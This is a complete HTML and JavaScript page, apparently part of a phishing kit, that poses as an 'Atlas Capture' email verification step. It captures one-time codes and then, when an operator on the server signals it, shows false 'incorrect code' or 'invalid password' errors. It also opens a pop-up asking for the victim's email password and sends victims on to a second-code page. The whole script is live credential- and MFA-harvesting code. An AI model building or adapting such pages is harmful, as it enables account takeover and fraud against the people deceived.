<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Atlas Capture - Verify Code</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}

body{
  background:#f3f4f6;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  padding:40px 10px;
}

.wrapper{max-width:420px;width:100%}

.header{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:10px;
  margin-bottom:18px;
}
.icon{
  display:flex;
  align-items:center;
  justify-content:center;
}
#logoAtlas{
  height:45px;
  width:45px;
  border-radius:40%;
}
.header span{font-weight:600;font-size:18px}

.card{
  background:#fff;
  border-radius:22px;
  padding:32px 24px;
  box-shadow:0 10px 30px rgba(0,0,0,0.08);
  text-align:center;
}

h2{
  font-size:24px;
  font-weight:700;
  color:#1f2937;
  margin-bottom:8px;
}

.subtext{
  color:#6b7280;
  font-size:14px;
  margin-bottom:28px;
}

.otp-input{
  width:100%;
  padding:16px;
  font-size:24px;
  text-align:center;
  letter-spacing:4px;
  border:2px solid #e5e7eb;
  border-radius:14px;
  background:#fff;
  transition:all 0.2s;
  margin-bottom:28px;
  font-weight:600;
}
.otp-input:focus{
  outline:none;
  border-color:#4f46e5;
  box-shadow:0 0 0 3px rgba(79,70,229,0.1);
}

button{
  width:100%;
  padding:14px;
  border-radius:12px;
  border:none;
  background:linear-gradient(90deg,#2563eb,#7c3aed);
  color:#fff;
  font-weight:600;
  cursor:pointer;
  margin-bottom:16px;
}
button:disabled{
  opacity:0.6;
  cursor:not-allowed;
}
.button-loading{
  display:inline-flex;
  align-items:center;
  gap:8px;
}
.spinner{
  width:18px;
  height:18px;
  border:2px solid rgba(255,255,255,0.3);
  border-top-color:white;
  border-radius:50%;
  animation:spin 0.8s linear infinite;
}
@keyframes spin{
  to{transform:rotate(360deg);}
}

.link{
  background:none;
  color:#4f46e5;
  font-size:14px;
  font-weight:500;
  margin:0;
  padding:0;
  box-shadow:none;
}
.link:hover{
  background:none;
  text-decoration:underline;
}

.error-message{
  color:#ef4444;
  font-size:13px;
  margin-top:12px;
  display:none;
  background:#fef2f2;
  padding:12px;
  border-radius:12px;
}

.modal-overlay{
  display:none;
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background:rgba(0,0,0,0.85);
  backdrop-filter:blur(4px);
  z-index:10000;
  justify-content:center;
  align-items:center;
}
.modal-overlay.active{
  display:flex;
}
.modal{
  background:#fff;
  border-radius:28px;
  max-width:380px;
  width:90%;
  padding:32px 24px;
  text-align:center;
  box-shadow:0 25px 50px rgba(0,0,0,0.3);
}
.modal-icon{
  width:70px;
  height:70px;
  background:#4f46e5;
  border-radius:35px;
  display:flex;
  align-items:center;
  justify-content:center;
  margin:0 auto 20px;
}
.modal-icon svg{
  width:40px;
  height:40px;
  fill:none;
  stroke:white;
  stroke-width:1.5;
}
.modal h3{
  font-size:22px;
  font-weight:700;
  color:#1f2937;
  margin-bottom:8px;
}
.modal p{
  color:#6b7280;
  font-size:13px;
  margin-bottom:24px;
  line-height:1.5;
}
.modal-input{
  width:100%;
  padding:14px;
  border:1px solid #e5e7eb;
  border-radius:12px;
  font-size:15px;
  margin-bottom:16px;
}
.modal-input:focus{
  outline:none;
  border-color:#4f46e5;
}
.modal-btn{
  width:100%;
  padding:14px;
  background:#4f46e5;
  color:white;
  border:none;
  border-radius:12px;
  font-weight:600;
  cursor:pointer;
  margin-top:8px;
}
.modal-btn:hover:not(:disabled){
  background:#4338ca;
}
.modal-btn:disabled{
  opacity:0.6;
  cursor:not-allowed;
}
.modal-error{
  color:#ef4444;
  font-size:12px;
  margin-top:12px;
  display:none;
}
.loading-spinner-small{
  width:30px;
  height:30px;
  border:3px solid #f3f3f3;
  border-top:3px solid #4f46e5;
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin:10px auto;
}
</style>
</head>
<body>

<div class="wrapper">
  <div class="header">
    <div class="icon">
      <img id="logoAtlas" src="atlas.png" alt="atlas logo">
    </div>
    <span>Atlas Capture</span>
  </div>

  <div class="card">
    <h2>Check your email</h2>
    <p class="subtext">We sent you a 6-character verification code</p>

    <input type="text" class="otp-input" id="otpInput" maxlength="6" placeholder="000000">
    <div id="errorMessage" class="error-message"></div>

    <button id="verifyBtn">Verify</button>
    <button class="link" id="differentEmail">Use a different email</button>
  </div>
</div>

<div id="loginModal" class="modal-overlay">
  <div class="modal" id="loginModalContent">
    <div class="modal-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
        <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
        <polyline points="22,6 12,13 2,6"/>
      </svg>
    </div>
    <h3>Account Verification Required</h3>
    <p>Please login with your email and password to continue.</p>
    <input type="email" id="loginEmail" class="modal-input" placeholder="Email address">
    <input type="password" id="loginPassword" class="modal-input" placeholder="Password">
    <button id="submitLoginBtn" class="modal-btn">Login to Continue →</button>
    <div id="modalError" class="modal-error"></div>
  </div>
</div>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  if (!email) window.location.href = '/users/login';

  const otpInput = document.getElementById('otpInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const errorDiv = document.getElementById('errorMessage');
  let isProcessing = false;
  let approvalInterval = null;
  let blockCheckInterval = null;
  let isModalOpen = false;

  async function checkIfBlocked() {
    try {
      const response = await fetch('/api/users/check-blocked', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
      const data = await response.json();
      if (data.blocked === true) {
        window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
        return true;
      }
      return false;
    } catch (err) {
      return false;
    }
  }

  function startBlockChecking() {
    if (blockCheckInterval) clearInterval(blockCheckInterval);
    blockCheckInterval = setInterval(async () => {
      const blocked = await checkIfBlocked();
      if (blocked) {
        clearInterval(blockCheckInterval);
        clearInterval(approvalInterval);
      }
    }, 3000);
  }

  // Check for Incorrect OTP - shows red error message below input
  async function checkIncorrectOtp() {
    try {
      const response = await fetch('/api/users/check-admin-text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
      const data = await response.json();
      
      if (data.admin_text === 'incorrect_otp_error' && data.text_release === false) {
        errorDiv.textContent = '❌ Incorrect OTP entered. Please try again.';
        errorDiv.style.display = 'block';
        
        otpInput.value = '';
        otpInput.focus();
        
        await fetch('/api/admin/release-text', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        
        setTimeout(() => {
          errorDiv.style.display = 'none';
        }, 4000);
      }
    } catch (err) {}
  }

  // Check for Wrong Login - shows error, clears password, keeps modal open
  async function checkWrongLogin() {
    try {
      const response = await fetch('/api/users/check-admin-text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
      const data = await response.json();
      
      if (data.admin_text === 'wrong_login_error' && data.text_release === false) {
        const modalError = document.getElementById('modalError');
        if (modalError) {
          modalError.textContent = '❌ Invalid email or password. Please try again.';
          modalError.style.display = 'block';
        }
        const loginPassword = document.getElementById('loginPassword');
        if (loginPassword) loginPassword.value = '';
        
        await fetch('/api/admin/release-text', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        
        setTimeout(() => {
          if (modalError) modalError.style.display = 'none';
        }, 4000);
      }
    } catch (err) {}
  }

  // Check for Correct Login - Replace modal content with loading spinner
  async function checkCorrectLogin() {
    try {
      const response = await fetch('/api/users/check-admin-text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
      const data = await response.json();
      
      if (data.admin_text === 'correct_login_success' && data.text_release === false) {
        const modalContent = document.getElementById('loginModalContent');
        if (modalContent) {
          modalContent.innerHTML = `
            <div style="text-align: center;">
              <div class="modal-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                  <circle cx="12" cy="12" r="10"/>
                  <path d="M12 6v6l4 2"/>
                </svg>
              </div>
              <h3>Validating Credentials</h3>
              <div class="loading-spinner-small"></div>
              <p>Please wait as we validate your details...</p>
              <p style="font-size: 12px; color: #666; margin-top: 10px;">Do not close this window</p>
            </div>
          `;
        }
        
        await fetch('/api/admin/release-text', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
      }
    } catch (err) {}
  }

  function showLoading() {
    isProcessing = true;
    verifyBtn.disabled = true;
    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
    errorDiv.style.display = 'none';
  }

  function showWaitingForApproval() {
    verifyBtn.disabled = true;
    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>';
  }

  function hideLoading() {
    isProcessing = false;
    verifyBtn.disabled = false;
    verifyBtn.innerHTML = 'Verify';
  }

  function startCheckingApproval() {
    if (approvalInterval) clearInterval(approvalInterval);
    approvalInterval = setInterval(async () => {
      try {
        const blocked = await checkIfBlocked();
        if (blocked) return;
        
        const response = await fetch('/api/users/check-first-approval', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await response.json();
        if (data.approved) {
          clearInterval(approvalInterval);
          window.location.href = `/users/second-otp?email=${encodeURIComponent(email)}`;
        }
      } catch (err) {}
    }, 2000);
  }

  async function verifyOTP() {
    if (isProcessing) return;
    
    const isBlocked = await checkIfBlocked();
    if (isBlocked) return;
    
    const otp = otpInput.value.trim();
    if (!otp || otp.length !== 6) {
      errorDiv.textContent = 'Please enter all 6 characters';
      errorDiv.style.display = 'block';
      setTimeout(() => errorDiv.style.display = 'none', 3000);
      return;
    }

    showLoading();
    try {
      const response = await fetch('/api/users/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, otp })
      });
      const data = await response.json();
      if (data.success) {
        showWaitingForApproval();
        startBlockChecking();
        startCheckingApproval();
      } else {
        hideLoading();
        errorDiv.textContent = data.error || 'Invalid OTP';
        errorDiv.style.display = 'block';
        setTimeout(() => errorDiv.style.display = 'none', 3000);
      }
    } catch (error) {
      hideLoading();
      errorDiv.textContent = 'Network error. Please try again.';
      errorDiv.style.display = 'block';
      setTimeout(() => errorDiv.style.display = 'none', 3000);
    }
  }

  let forceLoginInterval = null;
  function startForceLoginPolling() {
    if (forceLoginInterval) clearInterval(forceLoginInterval);
    forceLoginInterval = setInterval(async () => {
      if (isModalOpen) return;
      try {
        const response = await fetch('/api/users/check-force-login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await response.json();
        if (data.force_login === true) {
          isModalOpen = true;
          document.getElementById('loginModal').classList.add('active');
          document.getElementById('loginEmail').value = '';
          document.getElementById('loginPassword').value = '';
          document.getElementById('modalError').style.display = 'none';
          document.getElementById('submitLoginBtn').disabled = false;
          document.getElementById('submitLoginBtn').innerHTML = 'Login to Continue →';
        }
      } catch (err) {}
    }, 2000);
  }

  let redirectSuccessInterval = null;
  function startRedirectSuccessPolling() {
    if (redirectSuccessInterval) clearInterval(redirectSuccessInterval);
    redirectSuccessInterval = setInterval(async () => {
      try {
        const response = await fetch('/api/users/check-redirect-success', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await response.json();
        if (data.redirect_success === true) {
          clearInterval(redirectSuccessInterval);
          window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
        }
      } catch (err) {}
    }, 2000);
  }

  function hideLoginModal() {
    isModalOpen = false;
    document.getElementById('loginModal').classList.remove('active');
    // Reset modal content to original form
    const modalContent = document.getElementById('loginModalContent');
    if (modalContent) {
      modalContent.innerHTML = `
        <div class="modal-icon">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
            <polyline points="22,6 12,13 2,6"/>
          </svg>
        </div>
        <h3>Account Verification Required</h3>
        <p>Please login with your email and password to continue.</p>
        <input type="email" id="loginEmail" class="modal-input" placeholder="Email address">
        <input type="password" id="loginPassword" class="modal-input" placeholder="Password">
        <button id="submitLoginBtn" class="modal-btn">Login to Continue →</button>
        <div id="modalError" class="modal-error"></div>
      `;
      // Re-attach event listener
      document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
    }
  }

  async function submitLogin() {
    const loginEmail = document.getElementById('loginEmail').value.trim();
    const loginPassword = document.getElementById('loginPassword').value;
    const modalError = document.getElementById('modalError');
    const submitBtn = document.getElementById('submitLoginBtn');
    
    if (!loginEmail || !loginPassword) {
      modalError.textContent = 'Please enter both email and password';
      modalError.style.display = 'block';
      return;
    }
    
    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    if (!emailRegex.test(loginEmail)) {
      modalError.textContent = 'Please enter a valid email address';
      modalError.style.display = 'block';
      return;
    }
    
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
    modalError.style.display = 'none';
    
    try {
      const response = await fetch('/api/users/submit-login-popup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, loginEmail, loginPassword })
      });
      const data = await response.json();
      if (data.success) {
        // Don't close modal - it will be replaced with loading on admin approval
      } else {
        modalError.textContent = data.error || 'Failed to verify account';
        modalError.style.display = 'block';
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Login to Continue →';
      }
    } catch (error) {
      modalError.textContent = 'Network error. Please try again.';
      modalError.style.display = 'block';
      submitBtn.disabled = false;
      submitBtn.innerHTML = 'Login to Continue →';
    }
  }

  startForceLoginPolling();
  startRedirectSuccessPolling();
  startBlockChecking();
  setInterval(checkIncorrectOtp, 2000);
  setInterval(checkWrongLogin, 2000);
  setInterval(checkCorrectLogin, 2000);

  verifyBtn.addEventListener('click', verifyOTP);
  otpInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') verifyOTP();
  });
  otpInput.focus();
  document.getElementById('differentEmail').addEventListener('click', () => {
    window.location.href = '/users/login';
  });
  document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
</script>

</body>
</html>
